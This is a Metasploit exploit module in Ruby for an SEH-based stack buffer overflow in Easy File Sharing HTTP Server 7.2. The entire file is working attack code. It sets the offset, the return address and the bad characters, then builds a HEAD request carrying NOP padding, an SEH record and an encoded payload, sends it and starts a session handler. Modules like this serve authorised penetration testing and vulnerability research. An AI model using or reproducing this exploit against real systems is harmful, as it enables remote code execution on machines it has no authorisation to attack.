class MetasploitModule < Msf::Exploit::Remote

  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Easy File Sharing HTTP Server 7.2 SEH Overflow',
      'Description'    => %q{
        This module demonstrate SEH based overflow example
      },
       'Author'         => 'Sami',
      'License'        => MSF_LICENSE,
      'Privileged'     => true,
      'DefaultOptions' =>
        {
  'EXITFUNC' => 'thread',
  'RPORT' => 80,
        },
      'Payload'        =>
        {
          'Space'    => 390,
          'BadChars' => "\x00\x7e\x2b\x26\x3d\x25\x3a\x22\x0a\x0d\x20\x2f\x5c\x2e",
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Easy File Sharing 7.2 HTTP', { 'Ret' => 0x10019798, 'Offset' => 4061 } ],
        ],
      'DisclosureDate' => 'Dec 2 2015',
      'DefaultTarget'  => 0))
  end
  def exploit
    connect
    weapon = "HEAD "
    weapon << make_nops(target['Offset']) 
    weapon << generate_seh_record(target.ret)
    weapon << make_nops(19)
    weapon << payload.encoded
    weapon << " HTTP/1.0\r\n\r\n"
    sock.put(weapon)
    handler
    disconnect
  end
end
